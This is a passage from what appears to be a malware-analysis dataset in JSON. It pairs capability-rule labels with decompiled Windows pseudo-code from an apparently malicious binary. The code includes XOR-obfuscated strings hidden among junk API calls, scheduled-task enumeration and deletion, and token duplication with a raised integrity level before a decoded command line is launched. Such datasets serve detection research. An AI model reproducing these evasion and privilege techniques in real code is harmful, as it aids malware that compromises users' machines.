0x184, var_98h, &var_98h);\n    }\n    puVar7 = 0x41cb80;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.0040b061();\n    puVar9 = &var_c4h;\n    for (iVar2 = 0x1c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &var_a4h;\n    for (iVar2 = 0xc; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar7 = 0x41cb6c;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar9 = &var_34ch;\n    for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)(&var_34ch, &var_a8h);\n    var_30h = 6;\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar2 != 0) {\n        var_20h = 0x46255613;\n        var_1ch._0_1_ = 0x2c;\n        var_1ch._1_1_ = 0x75;\n        var_1ch._2_2_ = 0x5614;\n        var_18h._0_2_ = 0x4638;\n        var_18h._2_2_ = 0x7528;\n        var_14h._0_2_ = 0x560b;\n        var_14h._2_2_ = 0x4633;\n        var_10h._0_2_ = 0x7569;\n        var_8h = 0x46765646;\n        var_4h._0_2_ = 0x7569;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = 0;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetMessageTime)();\n            if (iVar4 != 0x7702c0) {\n                *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + iVar2)[&var_20h - iVar2];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x12);\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(iVar2, &var_34ch);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    iVar2 = fcn.004075db();\n    var_44h = 5;\n    if (iVar2 != 0) {\n        if (2 < var_c4h._1_1_) {\n            iVar2 = 0;\n            if (0 < var_c4h._1_1_ - 2) {\n                do {\n                    *0x41cb5c = *0x41cb5c + (&var_b8h)[iVar2];\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < var_c4h._1_1_ - 2);\n            }\n        }\n        *0x41cb5c = *0x41cb5c ^ 0x43103655;\n        iVar2 = fcn.0040b8c7();\n        if (iVar2 != 0) {\n            if (*0x41cb40 < 6) {\n                var_94h = 0x2f505037;\n                var_90h = 0x3b233c72;\n                var_8ch = 0x2b347222;\n                var_88h = 0x31725043;\n                var_84h = 0xd43512d;\n                var_80h = 0x28312548;\n                var_7ch = 0x392d4800;\n                var_78h = 0x2b487250;\n                var_74h = 0x32614236;\n                var_70h = 0xa223751;\n                var_6ch = 0x2a3f513a;\n                var_68h = 0x39514872;\n                var_64h = 0x2b5b603e;\n                var_60h = 0x30002443;\n                var_5ch = 0x82c4323;\n                var_58h = 0x29435148;\n                var_54h._0_2_ = 0x5a08;\n                var_54h._2_1_ = 0x6a;\n                var_2ch = 0x6b786a73;\n                var_28h._0_1_ = 0x49;\n                uVar3 = (*pcVar6)(8, 0x44);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar8 = 0;\n                var_40h = &var_94h - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n                    if (iVar4 != 0x92f457) {\n                        *(iVar8 + iVar2) = *(&var_2ch + iVar8 % var_44h) ^ (iVar8 + iVar2)[var_40h];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x43);\n            }\n            else {\n                var_1ch._0_1_ = 0x32;\n                var_1ch._1_1_ = 0x48;\n                var_1ch._2_2_ = 0x221a;\n                var_18h._0_2_ = 0x560b;\n                var_18h._2_2_ = 0x3c5a;\n                var_14h._0_2_ = 0x5465;\n                var_14h._2_2_ = 0x567c;\n                var_10h._0_2_ = 0x252d;\n                var_10h._2_2_ = 0x6f1b;\n                var_8h = 0x6f327261;\n                var_4h._0_2_ = 0x6d47;\n                uVar3 = (*pcVar6)(8, 0x11);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar8 = 0;\n                var_40h = &var_1ch - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    if (iVar4 != 0xfbeefa) {\n                        *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + iVar2)[var_40h];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x10);\n            }\n            var_a4h = 0xc;\n            var_9ch = 0;\n            var_a0h = 0;\n            (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)(iVar2, 1, &var_a0h, 0);\n            uVar3 = (*pcVar6)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n    }\n    *0x41cb78 = fcn.0040bfa3();\n    *0x41cb78 = *0x41cb78 & 0xffff;\n    var_1ch._0_1_ = 4;\n    var_1ch._1_1_ = 8;\n    var_1ch._2_2_ = 0x90c;\n    var_18h._0_2_ = 0x1734;\n    var_18h._2_2_ = 0x1509;\n    var_14h._0_2_ = 0x230d;\n    var_14h._2_2_ = 0x112b;\n    var_10h._0_2_ = 0x7013;\n    var_8h = 0x56697061;\n    var_4h._0_2_ = 0x7447;\n    uVar3 = (*pcVar6)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_50h = &var_1ch - iVar2;\n    var_40h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar4 != 0xb6a319) {\n            *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + iVar2)[var_50h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    var_1ch._0_1_ = 0x24;\n    var_1ch._1_1_ = 0x1b;\n    var_1ch._2_2_ = 0x5a16;\n    var_18h._0_2_ = 0x3653;\n    var_18h._2_2_ = 0x1803;\n    var_14h._0_2_ = 0x525a;\n    var_14h._2_2_ = 0x1b3a;\n    var_10h._0_2_ = 0x341a;\n    var_2ch = 0x34776f57;\n    var_28h._0_1_ = 0x37;\n    uVar3 = (*pcVar6)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_24h = 0;\n    var_3ch = &var_1ch - iVar2;\n    var_50h = iVar2;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar8 != 0xd6837c) {\n            *(var_24h + iVar2) = *(&var_2ch + var_24h % var_44h) ^ (var_24h + iVar2)[var_3ch];\n        }\n        var_24h = var_24h + 1;\n    } while (var_24h < 0xe);\n    var_8h = 0x74313144;\n    var_4h._0_2_ = 0x7636;\n    var_4ch = 0x516e4261;\n    var_48h._0_2_ = 0x7652;\n    uVar3 = (*pcVar6)(8, 7);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_3ch = &var_8h - iVar2;\n    var_2ch = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar4 != 0x990fe5) {\n            *(iVar8 + iVar2) = *(&var_4ch + iVar8 % var_30h) ^ (iVar8 + iVar2)[var_3ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 6);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_104h, iVar2, var_40h, *0x412430);\n    *0x41cb34 = fcn.00408ec7();\n    *0x41cb78 = 6000;\n    var_24h = var_24h & 0xff000000 | 0x523e57;\n    var_8h = 0x47525a72;\n    var_4h._0_2_ = 0x4474;\n    uVar3 = (*pcVar6)(8, 4);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_3ch = &var_24h - iVar2;\n    var_4ch = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar4 != 0x6fe934) {\n            *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + iVar2)[var_3ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 3);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_144h, iVar2, *0x41cb78);\n    var_38h = 0x51131d36;\n    var_34h._0_1_ = 0x35;\n    var_8h = 0x34666f42;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x35);\n    uVar3 = (*pcVar6)(8, 6);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_24h = &var_38h - iVar2;\n    var_3ch = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar4 != 0x41a0bd) {\n            *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_44h) ^ (iVar8 + iVar2)[var_24h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_18h._0_2_ = 0x5738;\n    var_18h._2_2_ = 0x373c;\n    var_14h._0_2_ = 0x38;\n    var_14h._2_2_ = 0x5b11;\n    var_10h._0_2_ = 0x5336;\n    var_8h = 0x5352324e;\n    var_4h._0_2_ = 0x7257;\n    uVar3 = (*pcVar6)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_38h = &var_18h - iVar2;\n    var_24h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar4 != 0x69f024) {\n            *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + iVar2)[var_38h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_20h = 0x1601030c;\n    var_1ch._0_1_ = 8;\n    var_1ch._1_1_ = 0x13;\n    var_1ch._2_2_ = 0xb0d;\n    var_18h._0_2_ = 0xb1d;\n    var_18h._2_2_ = 0xd12;\n    var_14h._0_2_ = 0x1d1e;\n    var_14h._2_2_ = 0x130a;\n    var_10h._0_2_ = 0xc0b;\n    var_10h._2_2_ = 0x781d;\n    var_8h = 0x78686261;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x78);\n    uVar3 = (*pcVar6)(8, 0x15);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_38h = &var_20h - iVar2;\n    var_30h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar4 != 0xfdf404) {\n            *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_44h) ^ (iVar8 + iVar2)[var_38h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x14);\n    var_20h = 0x2307323a;\n    var_1ch._0_1_ = 0x59;\n    var_1ch._1_1_ = 5;\n    var_1ch._2_2_ = 0x1f;\n    var_18h._0_2_ = 0x4234;\n    var_18h._2_2_ = 0x3d0d;\n    var_14h._0_2_ = 0x2839;\n    var_14h._2_2_ = 0x1c44;\n    var_10h._0_2_ = 0x811;\n    var_10h._2_2_ = 0x5334;\n    var_ch = 0x68;\n    var_8h = 0x47695368;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x36);\n    uVar3 = (*pcVar6)(8, 0x16);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_38h = &var_20h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar4 != 0x17ead7) {\n            *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_44h) ^ (iVar8 + iVar2)[&var_20h - iVar2];\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_SetEnvironmentVariableA;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x15);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(var_50h, var_3ch);\n    (*pcVar6)(var_24h, &var_104h);\n    (*pcVar6)(var_30h, 0x412434);\n    (*pcVar6)(iVar2, &var_144h);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    puVar9 = puVar5;\n    for (iVar8 = 0xc; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar5 = 0x20;\n    *0x41cb24 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n    pcVar6 = _sym.imp.KERNEL32.dll_CreateThread;\n    *0x41cb80 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004041b5, puVar5, 0, 0);\n    *0x41cb84 = (*pcVar6)(0, 0, fcn.004070d4, *0x41cb28, 0, 0);\n    *0x41cb88 = (*pcVar6)(0, 0, fcn.0040f5d0, puVar5, 0, 0);\n    *0x41cb8c = (*pcVar6)(0, 0, 0x40687a, puVar5, 0, 0);\n    uVar3 = (*pcVar6)(0, 0, fcn.00409beb, arg_8h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar1)(0, var_30h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_24h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_3ch);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_4ch);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_2ch);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_50h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_40h);\n    (*pcVar6)(uVar3);\n    return 0;\n}\n",
        "token_count": 5691
    },
    "0040c920": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040c920(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int16_t *piVar9;\n    uint lpFileName;\n    uint var_34h;\n    uint var_30h;\n    uint var_2bh;\n    uint var_27h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *ppv;\n    int32_t var_10h;\n    int16_t *var_ch;\n    int32_t pszFirst;\n    uint var_4h;\n    \n    var_30h._0_1_ = 0x22;\n    var_34h = 0;\n    var_20h = NULL;\n    ppv = NULL;\n    var_18h = NULL;\n    var_1ch = 0;\n    var_10h = 0;\n    stack0xffffffcd = 0x27303b4f;\n    var_2bh = 0x1c576d46;\n    var_27h._0_2_ = 0x464b;\n    var_27h._2_1_ = 0x4f;\n    pszFirst = 0x30574f46;\n    var_4h._0_1_ = 0x4b;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar7 = 0;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar6 != 0xf8ffc1) {\n            stack0xffffffd8 = 5;\n            *(iVar7 + piVar5) = *(&pszFirst + iVar7 % 5) ^ (iVar7 + piVar5)[&var_30h - piVar5];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    iVar7 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar7) {\n        iVar7 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x410380, 0, 1, 0x410370, &ppv);\n        if ((-1 < iVar7) && (ppv != NULL)) {\n            iVar7 = (**(*ppv + 0x14))(ppv, &var_20h);\n            if ((-1 < iVar7) && (var_20h != NULL)) {\n                iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                pcVar2 = _sym.imp.ole32.dll_CoTaskMemFree;\n                while ((-1 < iVar7 && (var_10h != 0))) {\n                    do {\n                        var_10h = var_10h + -1;\n                        uVar4 = *(var_1ch + var_10h * 4);\n                        unique0x10000306 = uVar4;\n                        iVar7 = (**(*ppv + 0x18))(ppv, uVar4, 0x410390, &var_18h);\n                        if ((-1 < iVar7) && (var_18h != NULL)) {\n                            pszFirst = 0;\n                            var_ch = NULL;\n                            iVar7 = (**(*var_18h + 0x84))(var_18h, &pszFirst);\n                            if ((-1 < iVar7) && (pszFirst != 0)) {\n                                iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, *0x41cb28);\n                                if ((iVar7 != 0) &&\n                                   ((iVar7 = (**(*var_18h + 0x8c))(var_18h, &var_ch),  -1 < iVar7 && (var_ch != NULL))))\n                                {\n                                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(var_ch, piVar5);\n                                    piVar3 = var_ch;\n                                    if ((iVar7 != 0) &&\n                                       (((*var_ch == 0x22 && (var_ch[2] == 0x3a)) && (var_ch[3] == 0x5c)))) {\n                                        puVar8 = &lpFileName;\n                                        for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                                            *puVar8 = 0;\n                                            puVar8 = puVar8 + 1;\n                                        }\n                                        piVar9 = piVar5;\n                                        do {\n                                            iVar1 = *piVar9;\n                                            piVar9 = piVar9 + 1;\n                                        } while (iVar1 != var_34h);\n                                        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(piVar3, piVar5);\n                                        (*_sym.imp.SHLWAPI.dll_StrCpyNW)\n                                                  (&lpFileName, var_ch + 1, \n                                                   ((iVar7 - var_ch >> 1) - 2) + (piVar9 - (piVar5 + 1) >> 1));\n                                        iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(&lpFileName);\n                                        uVar4 = stack0xffffffd8;\n                                        if (iVar7 == -1) {\n                                            (**(*ppv + 0x1c))(ppv, stack0xffffffd8);\n                                        }\n                                    }\n                                    (*pcVar2)(var_ch);\n                                }\n                                (*pcVar2)(pszFirst);\n                            }\n                            (**(*var_18h + 8))(var_18h);\n                        }\n                        (*pcVar2)(uVar4);\n                    } while (var_10h != 0);\n                    (*pcVar2)(var_1ch);\n                    iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                }\n                (**(*var_20h + 8))(var_20h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 1469
    },
    "0040e802": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040e802(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t *piVar8;\n    uint *puVar9;\n    uint lpCommandLine;\n    int32_t var_b0h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint TokenHandle;\n    uint var_50h;\n    uint pSessionId;\n    uint hExistingToken;\n    int32_t *var_44h;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint hToken;\n    uint var_8h;\n    uint var_4h;\n    \n    var_50h = 4;\n    var_38h._0_2_ = 0x1000;\n    piVar8 = param_2;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *piVar8 = 0;\n        piVar8 = piVar8 + 1;\n    }\n    pSessionId = 0;\n    puVar9 = &lpCommandLine;\n    var_44h = param_2;\n    for (iVar6 = 0x44; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hToken = 0;\n    puVar9 = &var_6ch;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hExistingToken = 0;\n    var_30h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    iVar6 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (iVar6 != 0) {\n        var_64h = iVar6;\n        iVar2 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(iVar6, 0x201eb, &hExistingToken);\n            if (iVar2 != 0) {\n                fcn.0040d1ad();\n                iVar2 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar2 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar6 != 0) {\n                        var_68h = 0x20;\n                        var_6ch = pSid;\n                        iVar6 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(hToken, 0x19, &var_6ch, iVar6 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_58h = 0;\n                    (*pcVar1)(hToken, 0x1b, &var_58h, 4);\n                    iVar6 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_30h, hToken, 1);\n                    if (iVar6 == 0) {\n                        var_30h = 0;\n                    }\n                    else {\n                        var_50h = 0x404;\n                    }\n                    lpCommandLine = 0x44;\n                    var_2ch = 0x7a2e7747;\n                    var_28h = 0x47043003;\n                    var_24h = 0x77516d0e;\n                    var_20h = 0x30317a77;\n                    var_1ch = 0x6d1f4713;\n                    var_18h = 0x7a267756;\n                    var_14h = 0x471b3018;\n                    var_10h = 0x77306d0e;\n                    var_8h = 0x7a477730;\n                    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x6d);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x41);\n                    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar2 = 0;\n                    var_34h = &var_2ch - iVar6;\n                    var_60h = iVar6;\n                    do {\n                        iVar4 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n                        if (iVar4 != 0xb364a) {\n                            var_5ch = 5;\n                            *(iVar2 + iVar6) = *(&var_8h + iVar2 % 5) ^ (iVar2 + iVar6)[var_34h];\n                        }\n                        iVar2 = iVar2 + 1;\n                    } while (iVar2 < 0x20);\n                    var_24h = 0x701a5726;\n                    var_20h = 0x573d6e01;\n                    var_1ch = 0x6e117003;\n                    var_18h = 0x70425721;\n                    var_14h = 0x572d6e07;\n                    var_10h = 0x6e627009;\n                    var_8h = 0x706c5755;\n                    var_4h._0_2_ = 0x6e62;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x31);\n                    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar2 = 0;\n                    var_34h = &var_24h - iVar6;\n                    do {\n                        iVar5 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                        piVar8 = var_44h;\n                        iVar4 = var_60h;\n                        if (iVar5 != 0x1aa4e4) {\n                            var_34h = 6;\n                            *(iVar2 + iVar6) = *(&var_8h + iVar2 % 6) ^ (iVar2 + iVar6)[&var_24h - iVar6];\n                        }\n                        iVar2 = iVar2 + 1;\n                    } while (iVar2 < 0x18);\n                    var_88h._0_2_ = 0;\n                    var_b0h = var_60h;\n                    var_8ch = 1;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, iVar6, 0, 0, 0, 0, var_50h, var_30h, 0, &lpCommandLine, var_44h);\n                    pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*piVar8 != 0) {\n                        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*piVar8, 0x201eb, &TokenHandle);\n                        if (iVar2 != 0) {\n                            fcn.0040d1ad();\n                            (*pcVar7)(TokenHandle);\n                        }\n                        (*pcVar7)(var_44h[1]);\n                    }\n                    if (var_30h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_30h);\n                    }\n                    (*pcVar7)(hToken);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*pcVar1)(uVar3);\n                    param_2 = var_44h;\n                    iVar6 = var_64h;\n                }\n                (*pcVar7)(hExistingToken);\n            }\n        }\n        (*pcVar7)(iVar6);\n    }\n    return *param_2;\n}\n",
        "token_count": 2106
    },
    "0040eb2d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040eb2d(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpCommandLine;\n    uint var_98h;\n    uint *var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4ch = 0x69356552;\n    iVar5 = 0x44;\n    var_48h = 0x6504794a;\n    puVar6 = param_1;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_44h = 0x79566912;\n    var_40h = 0x6934651a;\n    puVar6 = &var_98h;\n    var_54h = param_1;\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_98h = 0x44;\n    var_3ch = 0x6518795c;\n    puVar6 = &lpCommandLine;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_38h = 0x79166912;\n    var_34h = 0x6915652b;\n    var_30h = 0x6504794a;\n    var_2ch = 0x79566912;\n    var_28h = 0x6955651a;\n    var_24h = 0x652b7901;\n    var_20h = 0x79456915;\n    var_1ch = 0x690e6514;\n    var_18h = 0x6504795c;\n    var_14h = 0x791d6912;\n    var_10h = 0x691e6512;\n    var_ch = 0x65777956;\n    var_8h = 0x69666577;\n    var_4h._0_2_ = 0x7933;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x89);\n    iVar4 = 